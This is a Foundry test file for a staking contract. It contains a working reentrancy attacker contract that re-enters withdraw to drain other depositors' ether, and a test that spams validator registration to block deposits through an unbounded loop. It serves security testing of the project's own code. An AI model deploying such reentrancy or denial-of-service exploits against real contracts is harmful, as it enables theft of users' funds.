// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

import {LSToken} from "../src/LSToken.sol";
import {StakingManager} from "../src/StakingManager.sol";

contract ReentrancyAttacker {
    StakingManager public immutable manager;
    LSToken public immutable token;
    bool internal reentered;

    constructor(StakingManager _manager) {
        manager = _manager;
        token = _manager.token();
    }

    function attack() external payable {
        manager.deposit{value: msg.value}();
        manager.withdraw(token.balanceOf(address(this)));
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            manager.withdraw(token.balanceOf(address(this)));
        }
    }
}

contract StakingManagerTest is Test {
    StakingManager internal manager;
    LSToken internal token;

    function setUp() public {
        manager = new StakingManager();
        token = manager.token();
    }

    function testReentrancyDrain() public {
        address victim = address(0xBEEF);
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        manager.deposit{value: 10 ether}();

        ReentrancyAttacker attacker = new ReentrancyAttacker(manager);
        vm.deal(address(attacker), 1 ether);

        vm.prank(address(attacker));
        attacker.attack{value: 1 ether}();

        assertGt(address(attacker).balance, 1 ether, "attacker should profit from reentrancy");
        assertLt(address(manager).balance, 10 ether, "manager balance drained by attacker");
    }

    function testValidatorLoopDoS() public {
        // Anyone can spam the validator set.
        for (uint256 i; i < 50; i++) {
            manager.registerValidator(address(uint160(i + 1)));
        }

        address user = address(0x1234);
        vm.deal(user, 1 ether);

        vm.prank(user);
        (bool ok,) =
            address(manager).call{value: 1 ether, gas: 300_000}(abi.encodeWithSelector(manager.deposit.selector));
        assertFalse(ok, "limited-gas deposit should fail due to unbounded loop");
    }
}
